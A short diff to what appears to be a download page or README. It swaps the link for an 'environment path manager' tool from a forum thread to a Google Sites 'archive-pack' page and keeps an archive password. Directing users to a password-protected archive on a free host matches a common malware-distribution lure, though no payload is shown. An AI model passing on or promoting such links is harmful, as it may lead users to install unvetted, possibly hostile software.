@@ -28,9 +28,9 @@
 
 Important: Download the tool from the link below.
 
-Download: https://software-hub.forumotion.com/t21-environment-path-manager
+**Download:** https://sites.google.com/view/archive-pack/download
 
-Password: 68924
+**Password:** 68924
 
 ---
 
